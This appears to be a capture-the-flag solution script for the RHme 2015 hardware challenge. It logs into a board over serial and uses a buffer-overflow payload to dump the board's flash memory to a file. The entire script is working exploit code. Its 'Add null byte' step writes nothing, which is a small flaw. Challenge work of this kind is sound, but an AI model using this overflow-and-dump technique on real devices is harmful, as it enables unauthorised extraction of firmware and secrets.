#!/usr/bin/env python

from rhme_utilities import *

#---------------------------------------
#   Implementation
#---------------------------------------

# Change this to configure the script
fillChar = '\x7F'
firstPart = '\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F\x7F'
configPart = '\x00\x00'
customCommand = firstPart + configPart
outputFile = r'dumps/test_full_admin'
password = adminPassword

# Info and Style
print("")
print("-------------------- RHme 2015 Dumper --------------------")
print("")

# Define Main
def main():
	# Flush serial
	Serial_Flush()

	# Request Nonce
	sendCommand = "A" + crlf
	serialPort.write(sendCommand.encode())
	temp = serialPort.readline()
	print(temp.decode())
	temp = serialPort.readline()
	temp = serialPort.readline()
	print(temp.decode())

	# Login
	sendCommand = password + crlf
	serialPort.write(sendCommand.encode())
	# Flush Serial
	for f in range(0, 2):
		temp = serialPort.readline()
		print(temp.decode())

	# Open file
	dump = open(outputFile, "wb")

	# Loop for Flash Memory (max is 0x3FFF, step is 0x100)
	for loop in range(0x00, 0x40):
		dumpLength = 0
		while dumpLength < 0x80:
			# Request reading
			sendCommand = "R" + crlf
			serialPort.write(sendCommand.encode())
			temp = serialPort.readline()
			# Perform overflow
			sendCommand = firstPart + chr(dumpLength) + chr(loop) + crlf
			print("Dumping at: 0x" + f'{loop:02x}' + f'{dumpLength:02x}')
			serialPort.write(sendCommand.encode())
			# Flush Serial
			for f in range(0, 4):
				temp = serialPort.readline()
			# Dump everything
			temp = serialPort.read()
			while dumpLength < 0x100 and temp != b'':
				dump.write(temp)
				dumpLength += 1
				temp = serialPort.read()
			# Add null byte
			if dumpLength < 0x100:
				dump.write(b'')
				dumpLength += 1
		print("--- Memory Dumped ---")
	# Close File
	dump.close()
	print("Job's done!")

# Run Main
if __name__ == '__main__':
	main()
